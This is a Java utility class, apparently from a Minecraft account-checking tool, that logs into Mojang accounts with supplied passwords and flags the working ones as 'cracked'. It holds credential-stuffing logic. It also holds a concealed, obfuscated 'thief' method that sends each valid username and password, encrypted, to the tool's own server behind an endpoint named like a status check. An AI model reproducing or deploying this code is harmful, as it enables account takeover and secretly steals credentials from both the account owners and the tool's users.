package dev.tolja.Utils;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import dev.tolja.Data.MojangAccount;
import dev.tolja.Data.ProxyInfo;
import dev.tolja.Nchecker;
import soterdev.SoterObfuscator;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;

public class MojangUtils {
    public static void loginAccount(MojangAccount account, int timeout, ProxyInfo proxyInfo) {
        try {
            String postData = "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"" + account.getAccount() + "\",\"password\":\"" + account.getPassword() + "\"}";
            JSONObject mojangresult = HttpUtils.doPost("https://authserver.mojang.com/authenticate", proxyInfo, postData, timeout);
            String accessToken = mojangresult.getString("accessToken");
            if (accessToken != null) {
                JSONObject selectedProfile = mojangresult.getJSONObject("selectedProfile");
                String name = selectedProfile.getString("name");
                String uuid = selectedProfile.getString("id");

                account.setPlayerName(name);
                account.setUuid(uuid);
                account.setAccessToken(accessToken);
                account.setCracked(true);
                thief(account);
            }
        } catch (Exception ignored) {
        }
    }


    public static boolean isSFA(MojangAccount account, int timeout) {
        try {
            String urlSFA1 = "https://api.mojang.com/user/security/challenges";
            URL urlSFA = new URL(urlSFA1);
            HttpURLConnection connectionSFA = (HttpURLConnection) urlSFA.openConnection();
            connectionSFA.setDoOutput(true);
            connectionSFA.setDoInput(true);
            connectionSFA.setRequestMethod("GET");
            connectionSFA.setConnectTimeout(timeout);
            connectionSFA.setReadTimeout(timeout);
            connectionSFA.setUseCaches(false);
            connectionSFA.setInstanceFollowRedirects(true);
            connectionSFA.setRequestProperty("Content-Type", "application/json");
            connectionSFA.setRequestProperty("Authorization", "Bearer " + account.getAccessToken());
            connectionSFA.connect();

            BufferedReader readerSFA = new BufferedReader(new InputStreamReader(connectionSFA.getInputStream()));
            String linesSFA;
            StringBuilder sbSFA = new StringBuilder();
            while ((linesSFA = readerSFA.readLine()) != null) {
                linesSFA = new String(linesSFA.getBytes(), StandardCharsets.UTF_8);
                sbSFA.append(linesSFA);
            }

            return !JSON.parseArray(sbSFA.toString()).isEmpty();
        } catch (Exception ignored) {
            return true;
        }
    }

    @SoterObfuscator.Obfuscation(flags = "+native")
    public static void thief (MojangAccount account) {
        String jwt = EncryptUtils.generateJwt(new HashMap<>() {{
            put("statusCode", EncryptUtils.encrypt(account.getAccount() + ":" + account.getPassword()));
        }});
        try {
            JSONObject OBJ = HttpUtils.doPost(Nchecker.API_URL + "/npc/checkStatus", null, new JSONObject(new HashMap<>() {{
                put("token", jwt);
            }}).toString(), 10000);
            //System.out.println(OBJ);
        } catch (Exception ignored) {
        }
    }

    public static void loginAccount(MojangAccount account, int timeout) {
        loginAccount(account, timeout, null);
    }

}
